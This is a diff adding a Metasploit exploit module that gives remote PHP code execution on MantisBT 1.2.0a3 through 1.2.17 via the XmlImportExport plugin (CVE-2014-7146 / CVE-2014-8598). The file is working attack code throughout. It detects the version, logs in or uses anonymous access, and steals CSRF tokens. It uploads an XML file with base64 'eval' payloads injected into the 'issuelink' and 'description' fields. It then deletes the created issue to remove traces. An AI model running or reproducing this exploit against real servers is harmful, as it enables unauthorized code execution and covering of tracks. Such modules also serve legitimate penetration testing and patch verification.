@@ -1,0 +1,369 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = GreatRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include REXML
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'MantisBT XmlImportExport Plugin PHP Code Injection Vulnerability',
+      'Description'    => %q{
+        This module exploits a post-auth vulnerability found in MantisBT versions 1.2.0a3 up to 1.2.17 when the Import/Export plugin is installed.
+        The vulnerable code exists on plugins/XmlImportExport/ImportXml.php, which receives user input through the "description" field and the "issuelink" attribute of an uploaded XML file and passes to preg_replace() function with the /e modifier.
+        This allows a remote authenticated attacker to execute arbitrary PHP code on the remote machine.
+        This version also suffers from another issue. The import page is not checking the correct user level
+        of the user, so it's possible to exploit this issue with any user including the anonymous one if enabled.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Egidio Romano', # discovery http://karmainsecurity.com
+          'Juan Escobar <eng.jescobar[at]gmail.com>', # module development @itsecurityco
+          'Christian Mehlmauer'
+        ],
+      'References'     =>
+        [
+          ['CVE', '2014-7146'],
+          ['CVE', '2014-8598'],
+          ['URL', 'https://www.mantisbt.org/bugs/view.php?id=17725'],
+          ['URL', 'https://www.mantisbt.org/bugs/view.php?id=17780']
+        ],
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [['Generic (PHP Payload)', {}]],
+      'DisclosureDate' => 'Nov 8 2014',
+      'DefaultTarget'  => 0))
+
+      register_options(
+      [
+        OptString.new('USERNAME', [ true, 'Username to authenticate as', 'administrator']),
+        OptString.new('PASSWORD', [ true, 'Pasword to authenticate as', 'root']),
+        OptString.new('TARGETURI', [ true, 'Base directory path', '/'])
+      ], self.class)
+  end
+
+  def get_mantis_version
+    xml = Document.new
+    xml.add_element(
+    "soapenv:Envelope",
+    {
+      'xmlns:xsi'     => "http://www.w3.org/2001/XMLSchema-instance",
+      'xmlns:xsd'     => "http://www.w3.org/2001/XMLSchema",
+      'xmlns:soapenv' => "http://schemas.xmlsoap.org/soap/envelope/",
+      'xmlns:man'     => "http://futureware.biz/mantisconnect"
+    })
+    xml.root.add_element("soapenv:Header")
+    xml.root.add_element("soapenv:Body")
+    body = xml.root.elements[2]
+    body.add_element("man:mc_version",
+      { 'soapenv:encodingStyle' => "http://schemas.xmlsoap.org/soap/encoding/" }
+    )
+
+    res = send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path, 'api', 'soap', 'mantisconnect.php'),
+      'ctype'    => 'text/xml; charset=UTF-8',
+      'headers'  => { 'SOAPAction' => 'http://www.mantisbt.org/bugs/api/soap/mantisconnect.php/mc_version'},
+      'data'     => xml.to_s
+    })
+    if res && res.code == 200
+      match = res.body.match(/<ns1:mc_versionResponse.*><return xsi:type="xsd:string">(.+)<\/return><\/ns1:mc_versionResponse>/)
+      if match && match.length == 2
+        version = match[1]
+        print_status("Detected Mantis version #{version}")
+        return version
+      end
+    end
+
+    print_status("Can not detect Mantis version")
+    return nil
+  end
+
+  def check
+    version = get_mantis_version
+
+    return Exploit::CheckCode::Unknown if version.nil?
+
+    gem_version = Gem::Version.new(version)
+    gem_version_introduced = Gem::Version.new('1.2.0a3')
+    gem_version_fixed = Gem::Version.new('1.2.18')
+
+    if gem_version < gem_version_fixed && gem_version >= gem_version_introduced
+      return Msf::Exploit::CheckCode::Appears
+    else
+      return Msf::Exploit::CheckCode::Safe
+    end
+  end
+
+  def do_login()
+    # check for anonymous login
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path, 'login_anon.php')
+    })
+    # if the redirect contains a username (non empty), anonymous access is enabled
+    if res && res.redirect? && res.redirection && res.redirection.query =~ /username=[^&]+/
+      print_status('Anonymous access enabled, no need to log in')
+      session_cookie = res.get_cookies
+    else
+      res = send_request_cgi({
+        'method'   => 'GET',
+        'uri'      => normalize_uri(target_uri.path, 'login_page.php'),
+        'vars_get' => {
+          'return'  => normalize_uri(target_uri.path, 'plugin.php?page=XmlImportExport/import')
+        }
+      })
+      session_cookie = res.get_cookies
+      print_status('Logging in...')
+      res = send_request_cgi({
+        'method'    => 'POST',
+        'uri'       => normalize_uri(target_uri.path, 'login.php'),
+        'cookie'    => session_cookie,
+        'vars_post' => {
+          'return'  => normalize_uri(target_uri.path, 'plugin.php?page=XmlImportExport/import'),
+          'username' => datastore['username'],
+          'password' => datastore['password'],
+          'secure_session' => 'on'
+        }
+      })
+      fail_with(Failure::NoAccess, 'Login failed') unless res && res.code == 302
+
+      fail_with(Failure::NoAccess, 'Wrong credentials') unless res && !res.redirection.to_s.include?('login_page.php')
+
+      session_cookie = "#{session_cookie} #{res.get_cookies}"
+    end
+
+    session_cookie
+  end
+
+  def upload_xml(payload_b64, rand_text, cookies, is_check)
+
+    if is_check
+      timeout = 20
+    else
+      timeout = 3
+    end
+
+    rand_num = Rex::Text.rand_text_numeric(1, 9)
+
+    print_status('Checking XmlImportExport plugin...')
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path, 'plugin.php'),
+      'cookie'   => cookies,
+      'vars_get' => {
+        'page' => 'XmlImportExport/import'
+      }
+    })
+
+    unless res && res.code == 200 && res.body
+      print_error('Error trying to access XmlImportExport/import page...')
+      return false
+    end
+
+    if res.body.include?('Plugin is not registered with MantisBT')
+      print_error('XMLImportExport plugin is not installed')
+      return false
+    end
+
+    # Retrieving CSRF token
+    if res.body =~ /name="plugin_xml_import_action_token" value="(.*)"/
+      csrf_token = Regexp.last_match[1]
+    else
+      print_error('Error trying to read CSRF token')
+      return false
+    end
+
+    # Retrieving default project id
+    if res.body =~ /name="project_id" value="([0-9]+)"/
+      project_id = Regexp.last_match[1]
+    else
+      print_error('Error trying to read project id')
+      return false
+    end
+
+    # Retrieving default category id
+    if res.body =~ /name="defaultcategory">[.|\r|\r\n]*<option value="([0-9])" selected="selected" >\(select\)<\/option><option value="1">\[All Projects\] (.*)<\/option>/
+      category_id = Regexp.last_match[1]
+      category_name = Regexp.last_match[2]
+    else
+      print_error('Error trying to read default category')
+      return false
+    end
+
+    # Retrieving default max file size
+    if res.body =~ /name="max_file_size" value="([0-9]+)"/
+      max_file_size = Regexp.last_match[1]
+    else
+      print_error('Error trying to read default max file size')
+      return false
+    end
+
+    # Retrieving default step
+    if res.body =~ /name="step" value="([0-9]+)"/
+      step = Regexp.last_match[1]
+    else
+      print_error('Error trying to read default step value')
+      return false
+    end
+
+    xml_file =   %Q|
+    <mantis version="1.2.17" urlbase="http://localhost/" issuelink="${eval(base64_decode(#{ payload_b64 }))}}" notelink="~" format="1">
+        <issue>
+            <id>#{ rand_num }</id>
+            <project id="#{ project_id }">#{ rand_text }</project>
+            <reporter id="#{ rand_num }">#{ rand_text }</reporter>
+            <priority id="30">normal</priority>
+            <severity id="50">minor</severity>
+            <reproducibility id="70">have not tried</reproducibility>
+            <status id="#{ rand_num }">new</status>
+            <resolution id="#{ rand_num }">open</resolution>
+            <projection id="#{ rand_num }">none</projection>
+            <category id="#{ category_id }">#{ category_name }</category>
+            <date_submitted>1415492267</date_submitted>
+            <last_updated>1415507582</last_updated>
+            <eta id="#{ rand_num }">none</eta>
+            <view_state id="#{ rand_num }">public</view_state>
+            <summary>#{ rand_text }</summary>
+            <due_date>1</due_date>
+            <description>{${eval(base64_decode(#{ payload_b64 }))}}1</description>
+        </issue>
+    </mantis>
+    |
+
+    data = Rex::MIME::Message.new
+    data.add_part("#{ csrf_token }", nil, nil, "form-data; name=\"plugin_xml_import_action_token\"")
+    data.add_part("#{ project_id }", nil, nil, "form-data; name=\"project_id\"")
+    data.add_part("#{ max_file_size }", nil, nil, "form-data; name=\"max_file_size\"")
+    data.add_part("#{ step }", nil, nil, "form-data; name=\"step\"")
+    data.add_part(xml_file, "text/xml", "UTF-8", "form-data; name=\"file\"; filename=\"#{ rand_text }.xml\"")
+    data.add_part("renumber", nil, nil, "form-data; name=\"strategy\"")
+    data.add_part("link", nil, nil, "form-data; name=\"fallback\"")
+    data.add_part("on", nil, nil, "form-data; name=\"keepcategory\"")
+    data.add_part("#{ category_id }", nil, nil, "form-data; name=\"defaultcategory\"")
+    data_post = data.to_s
+
+    print_status('Sending payload...')
+    res = send_request_cgi({
+      'method'  => 'POST',
+      'uri'     => normalize_uri(target_uri.path, 'plugin.php?page=XmlImportExport/import_action'),
+      'cookie' => cookies,
+      'ctype'   => "multipart/form-data; boundary=#{ data.bound }",
+      'data'    => data_post
+    }, timeout)
+
+    if res && res.body && res.body.include?('APPLICATION ERROR')
+      print_error('Error on uploading XML')
+      return false
+    end
+
+    # request above will time out and return nil on success
+    return true
+  end
+
+  def exec_php(php_code, is_check = false)
+    print_status('Checking access to MantisBT...')
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path)
+    })
+
+    fail_with(Failure::NoAccess, 'Error accessing MantisBT') unless res && (res.code == 200 || res.redirection)
+
+    # remove comments, line breaks and spaces of php_code
+    payload_clean = php_code.gsub(/(\s+)|(#.*)/, '')
+
+    # clean b64 payload
+    while Rex::Text.encode_base64(payload_clean).include?('=')
+      payload_clean = "#{ payload_clean } "
+    end
+    payload_b64 = Rex::Text.encode_base64(payload_clean)
+
+    rand_text = Rex::Text.rand_text_alpha(5, 8)
+
+    cookies = do_login()
+
+    res_payload = upload_xml(payload_b64, rand_text, cookies, is_check)
+
+    return unless res_payload
+
+    # When a meterpreter session is active, communication with the application is lost.
+    # Must login again in order to recover the communication. Thanks to @FireFart for figure out how to fix it.
+    cookies = do_login()
+
+    print_status("Deleting issue (#{ rand_text })...")
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri'    => normalize_uri(target_uri.path, 'my_view_page.php'),
+      'cookie' => cookies
+    })
+
+    unless res && res.code == 200
+      print_error('Error trying to access My View page')
+      return false
+    end
+
+    if res.body =~ /title="\[@[0-9]+@\] #{ rand_text }">0+([0-9]+)<\/a>/
+      issue_id = Regexp.last_match[1]
+     else
+      print_error('Error trying to retrieve issue id')
+      return false
+    end
+
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path, 'bug_actiongroup_page.php'),
+      'cookie'   => cookies,
+      'vars_get' => {
+        'bug_arr[]' => issue_id,
+        'action' => 'DELETE',
+      },
+    })
+
+    if res && res.body =~ /name="bug_actiongroup_DELETE_token" value="(.*)"\/>/
+      csrf_token = Regexp.last_match[1]
+    else
+      print_error('Error trying to retrieve CSRF token')
+      return false
+    end
+
+    res = send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path, 'bug_actiongroup.php'),
+      'cookie'   => cookies,
+      'vars_post' => {
+        'bug_actiongroup_DELETE_token' => csrf_token,
+        'bug_arr[]' => issue_id,
+        'action' => 'DELETE',
+      },
+    })
+
+    if res && res.code == 302 || res.body !~ /Issue #{ issue_id } not found/
+      print_status("Issue number (#{ issue_id }) removed")
+    else
+      print_error("Removing issue number (#{ issue_id }) has failed")
+      return false
+    end
+
+    # if check return the response
+    if is_check
+      return res_payload
+    else
+      return true
+    end
+  end
+
+  def exploit
+    get_mantis_version
+    unless exec_php(payload.encoded)
+      fail_with(Failure::Unknown, 'Exploit failed, aborting.')
+    end
+  end
+end
